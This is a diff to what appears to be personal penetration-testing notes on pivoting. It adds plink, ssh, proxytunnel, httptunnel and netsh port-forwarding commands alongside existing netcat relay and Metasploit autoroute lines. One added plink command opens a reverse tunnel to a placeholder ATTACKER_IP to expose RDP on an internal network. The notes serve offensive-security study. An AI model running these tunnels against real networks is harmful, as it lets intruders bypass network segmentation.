@@ -37,6 +37,15 @@ Plink
 plink.exe
 	--binary for windows
 	plink.exe 111.11.1.2 -P 22 -C -N -D 1080 -l uname -pw pword
+		--standard plink usage
+	ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
+	plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
+		--leverage plink to expose RDP on non-routable network over SSH
+		--Open port 5555 on SSH_SERVER; incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
+
+ProxyTunnel
+proxytunnel -p PROX:3128 -d DEST:22 -a 5555
+ssh user@127.0.0.1 -p 5555
 
 TCP Relaying with Netcat
 nc -lvp 22
@@ -71,6 +80,15 @@ nc -nvv 10.11.1.15 8888
 encapsulation:
 httptunnel
 stunnel
+
+HTTP Tunnel: SSH Over HTTP
+hts -F localhost:22 80
+	--Server - open port 80; redirect all incoming traffic to localhost:80 to localhost:22
+htc -F 8080 111.11.1.11:80
+	--Client - open port 8080; redirect all incoming traffic to localhost:8080 to 111.11.1.11:80
+ssh localhost -p 8080
+	--Client - connect to localhost:8080 -> tunneled to 111.11.1.11:80 -> redirected to 111.11.1.11:22
+
 
 Servers
 nano $(locate /rinted.conf\n)
@@ -181,7 +199,11 @@ CLIENT
 	-Y - opens local port as a shell on the client
 	-L <ip>:<port>:<ip>:<port> and -L <ip>:<port>:<ip>:<port> open listeners on the target machine that will forward back my attacker host
 
-	 
+Netsh (Windows)
+netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
+	--native port forwarding on windows host
+
+
 Metasploit
 meterpreter>run autoroute -s 192.168.5.1/24
 meterpreter>run autoroute -p
